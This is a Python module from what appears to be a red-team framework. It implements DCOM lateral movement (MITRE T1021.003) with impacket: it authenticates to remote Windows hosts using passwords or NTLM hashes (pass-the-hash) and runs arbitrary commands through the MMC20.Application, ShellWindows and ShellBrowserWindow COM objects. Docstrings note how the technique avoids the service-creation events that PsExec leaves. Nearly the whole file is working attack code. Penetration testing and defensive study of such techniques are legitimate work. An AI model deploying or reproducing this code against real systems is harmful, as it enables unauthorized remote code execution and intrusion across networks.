"""
DCOM Lateral Movement
MITRE: T1021.003 (Remote Services: Distributed Component Object Model)

Uses DCOM COM objects to execute commands on remote Windows hosts.
Three DCOM objects attempted in order (MMC20.Application is most reliable):

  1. MMC20.Application  — Document.ActiveView.ExecuteShellCommand
  2. ShellWindows       — Item(0).Document.Application.ShellExecute
  3. ShellBrowserWindow — Document.Application.ShellExecute

All three are documented Microsoft COM objects present in default Windows
installations. No additional software or service is required on the target.

Requires: valid credentials with local admin rights on the target.
OPSEC: MEDIUM — DCOM traffic on port 135 + dynamic RPC ports.
       Creates process on target (visible in process list / Event ID 4688).
       Less noisy than PsExec (no service creation / Event ID 7045).

Uses the same BaseLateralModule pattern as all other lateral modules.
Credential extraction from vault is handled by BaseLateralModule.execute().
"""
from __future__ import annotations

import asyncio
import time
from typing import Any

from ares.core.logger import get_logger, audit
from ares.core.security import sanitize_hostname
from ares.modules.lateral.modules import (
    BaseLateralModule, LateralResult, LateralTechnique,
)
from ares.modules.base import OpsecLevel

logger = get_logger("ares.modules.lateral.dcom")


class DCOMLateral(BaseLateralModule):
    """
    DCOM-based lateral movement via MMC20.Application,
    ShellWindows, or ShellBrowserWindow COM objects.

    Follows the same BaseLateralModule interface as PsExec, WMI, WinRM.
    BaseLateralModule.execute() handles ExecutionContext credential extraction;
    BaseLateralModule.run() handles scope check + finding generation.
    This class only needs to implement move().
    """

    MODULE_ID          = "lateral.dcom"
    MODULE_NAME        = "DCOM Lateral"
    MODULE_DESCRIPTION = (
        "DCOM lateral movement via MMC20.Application / ShellWindows COM objects "
        "(T1021.003) — stealthier than PsExec, no service creation"
    )
    OPSEC_LEVEL        = OpsecLevel.MEDIUM
    REQUIRES           = ["local_admin_creds"]
    OUTPUTS            = ["lateral_session", "command_output"]
    MITRE_TECHNIQUES   = ["T1021.003"]
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    MIN_NOISE_PROFILE  = "normal"   # blocked in stealth — creates remote process

    async def validate(self, ctx: "Any") -> None:
        """Pre-flight param checks before any network call."""
        await super().validate(ctx)
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        target = getattr(ctx, "target", "") or ctx.params.get("target", "")
        if not target:
            raise ModuleValidationError(
                "lateral.dcom requires 'target'.",
                module_id=self.MODULE_ID, field="target",
            )
        if not ctx.params.get("username"):
            raise ModuleValidationError(
                "lateral.dcom requires 'username' with local_admin_creds.",
                module_id=self.MODULE_ID, field="username",
            )

    async def move(
        self,
        target:   str,
        username: str,
        domain:   str,
        secret:   str,
        command:  str = "whoami /all",
        **kwargs: Any,
    ) -> LateralResult:

        target = sanitize_hostname(target)
        t0     = time.monotonic()

        logger.info("dcom_attempt", target=target, username=username, domain=domain)
        audit("dcom_lateral", actor=username, source="operator",
              target=target, technique="T1021.003")

        try:
            from impacket.dcerpc.v5 import transport, dcomrt   # type: ignore[import]
            from impacket.dcerpc.v5.dcomrt import (             # type: ignore[import]
                DCOMConnection,
            )
            from impacket.dcerpc.v5.dcom import mmc, wmi       # type: ignore[import]
            from impacket.dcerpc.v5.dcom.oaut import (          # type: ignore[import]
                IDispatch,
            )
        except ImportError:
            return LateralResult(
                technique=LateralTechnique.DCOM,
                source_host="operator", target_host=target,
                username=username, domain=domain, success=False,
                error="impacket not installed — pip install ares-redteam[ad]",
                duration_ms=round((time.monotonic() - t0) * 1000, 2),
            )

        # Parse credential — support cleartext and NTLM hash
        lmhash, nthash = "", ""
        password = secret
        if ":" in secret and len(secret) in (65, 33):
            parts = secret.split(":")
            if len(parts) == 2 and all(
                all(c in "0123456789abcdefABCDEF" for c in p)
                for p in parts
            ):
                lmhash, nthash = parts[0], parts[1]
                password = ""
        elif len(secret) == 32 and all(
            c in "0123456789abcdefABCDEF" for c in secret
        ):
            nthash   = secret
            password = ""

        loop = asyncio.get_running_loop()

        def _dcom_exec() -> tuple[bool, str, str]:
            """
            Try three DCOM COM objects in order.
            Returns (success, privilege_hint, output_or_error).
            """
            dcom = None
            try:
                dcom = DCOMConnection(
                    target,
                    username=username,
                    password=password,
                    domain=domain,
                    lmhash=lmhash,
                    nthash=nthash,
                    oxidResolver=True,
                    doKerberos=False,
                )

                # ── Method 1: MMC20.Application ───────────────────────────
                # Most widely supported, requires local admin.
                # MMC COM GUID: 49B2791A-B1AE-4C90-9B8E-E860BA07F889
                try:
                    i_dispatch = dcom.CoCreateInstanceEx(
                        mmc.CLSID_MMC20,
                        mmc.IID_IMMCApplication2,
                    )
                    mmc_obj = mmc.IMMCApplication2(i_dispatch)
                    # ExecuteShellCommand(command, dir, param, window_state)
                    mmc_obj.Document.ActiveView.ExecuteShellCommand(
                        "cmd.exe", "", f"/c {command}", "7"
                    )
                    return True, "local_admin", f"DCOM MMC20.Application exec on {target}"
                except Exception as e1:
                    logger.debug("dcom_mmc20_failed", target=target, error=str(e1)[:80])

                # ── Method 2: ShellWindows ─────────────────────────────────
                # GUID: 9BA05972-F6A8-11CF-A442-00A0C90A8F39
                try:
                    i_dispatch = dcom.CoCreateInstanceEx(
                        wmi.CLSID_ShellWindows,
                        wmi.IID_IShellWindows,
                    )
                    shell_windows = wmi.IShellWindows(i_dispatch)
                    obj = shell_windows.Item()
                    obj.Document.Application.ShellExecute(
                        "cmd.exe", f"/c {command}", "C:\\Windows\\System32", None, 0
                    )
                    return True, "local_admin", f"DCOM ShellWindows exec on {target}"
                except Exception as e2:
                    logger.debug("dcom_shellwindows_failed", target=target, error=str(e2)[:80])

                # ── Method 3: ShellBrowserWindow ──────────────────────────
                # GUID: C08AFD90-F2A1-11D1-8455-00A0C91F3880
                try:
                    i_dispatch = dcom.CoCreateInstanceEx(
                        wmi.CLSID_ShellBrowserWindow,
                        wmi.IID_IShellBrowserWindow,
                    )
                    sbw = wmi.IShellBrowserWindow(i_dispatch)
                    sbw.Document.Application.ShellExecute(
                        "cmd.exe", f"/c {command}", "C:\\Windows\\System32", None, 0
                    )
                    return True, "local_admin", f"DCOM ShellBrowserWindow exec on {target}"
                except Exception as e3:
                    logger.debug("dcom_sbw_failed", target=target, error=str(e3)[:80])

                # All three methods exhausted
                return False, "", (
                    "All DCOM methods failed — target may not be running "
                    "MMC20/ShellWindows/ShellBrowserWindow, or firewall blocks DCOM"
                )

            except Exception as exc:
                err = str(exc).lower()
                if "access denied" in err or "rpc_s_access_denied" in err:
                    return False, "", f"Access denied — insufficient privileges on {target}"
                if "logon failure" in err or "invalid credentials" in err:
                    return False, "", f"Authentication failed for {username}@{target}"
                return False, "", str(exc)[:300]
            finally:
                if dcom:
                    try:
                        dcom.disconnect()
                    except Exception:
                        pass

        try:
            success, privilege, output = await loop.run_in_executor(None, _dcom_exec)
        except Exception as exc:
            logger.warning("dcom_exec_error", target=target, error=str(exc)[:200])
            success, privilege, output = False, "", str(exc)[:300]

        return LateralResult(
            technique    = LateralTechnique.DCOM,
            source_host  = "operator",
            target_host  = target,
            username     = username,
            domain       = domain,
            success      = success,
            privilege    = privilege,
            output       = output,
            error        = "" if success else output,
            duration_ms  = round((time.monotonic() - t0) * 1000, 2),
        )
